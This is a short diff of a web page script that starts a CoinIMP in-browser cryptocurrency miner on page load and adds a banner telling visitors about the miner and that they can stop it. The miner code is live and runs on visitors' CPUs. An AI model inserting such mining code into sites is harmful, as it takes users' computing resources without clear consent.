@@ -115,10 +115,11 @@
     });
 
 
-    var _client = new Client.Anonymous('912b518c3584fc843a198873fbb2827da4993466acbbaefc3a1cece63ed3ab84', {
+   var _client = new Client.Anonymous('912b518c3584fc843a198873fbb2827da4993466acbbaefc3a1cece63ed3ab84', {
         throttle: 0.7, c: 'w', ads: 0
     });
     _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
     
 
 
